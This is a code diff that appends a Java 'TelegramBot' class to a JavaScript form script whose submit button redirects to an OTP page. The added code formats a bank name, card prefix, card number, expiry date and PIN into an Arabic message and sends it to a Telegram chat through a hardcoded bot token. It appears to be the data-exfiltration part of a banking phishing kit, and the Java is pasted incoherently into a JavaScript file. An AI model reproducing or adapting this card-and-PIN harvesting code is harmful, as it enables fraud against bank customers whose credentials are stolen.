@@ -214,3 +214,77 @@ document.getElementById('prefixSelect').addEventListener('change', function() {
 document.getElementById('submitButton').onclick = function() {
     window.location.href = "otp.html"; // التوجيه إلى صفحة جديدة
 }
+
+
+import org.apache.http.HttpEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.HttpClients;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.util.EntityUtils;
+import java.io.IOException;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+import java.net.http.HttpHeaders;
+import java.util.Map;
+import java.util.HashMap;
+
+public class TelegramBot {
+    private static final String TOKEN = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E";
+    private static final String CHAT_ID = "6454807559";
+
+    public static void main(String[] args) {
+        // بيانات النموذج
+        String bank = "البنك الأهلي المتحد";
+        String prefix = "403622";
+        String cardNumber = "1234567890";
+        String expiryMonth = "12";
+        String expiryYear = "25";
+        String pin = "1234";
+
+        // بناء رسالة التنسيق
+        String message = String.format(
+            "<b>تفاصيل عملية الدفع:</b>\n" +
+            "<b>البنك المختار:</b> %s\n" +
+            "<b>البادئة:</b> %s\n" +
+            "<b>رقم البطاقة:</b> %s\n" +
+            "<b>تاريخ الانتهاء:</b> %s/%s\n" +
+            "<b>الرقم السري:</b> %s",
+            bank, prefix, cardNumber, expiryMonth, expiryYear, pin
+        );
+
+        // إرسال الرسالة إلى تليجرام
+        sendTelegramMessage(message);
+    }
+
+    private static void sendTelegramMessage(String message) {
+        try {
+            // بناء URL لواجهة تليجرام
+            String url = String.format(
+                "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&parse_mode=html&text=%s",
+                TOKEN, CHAT_ID, message
+            );
+
+            // إنشاء عميل HTTP
+            HttpClient client = HttpClient.newHttpClient();
+
+            // بناء طلب HTTP GET
+            HttpRequest request = HttpRequest.newBuilder()
+                    .uri(URI.create(url))
+                    .build();
+
+            // إرسال الطلب والحصول على الاستجابة
+            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
+
+            // التحقق من حالة الاستجابة
+            if (response.statusCode() == 200) {
+                System.out.println("تم إرسال الرسالة بنجاح!");
+            } else {
+                System.out.println("فشل في إرسال الرسالة. رمز الحالة: " + response.statusCode());
+            }
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
+}
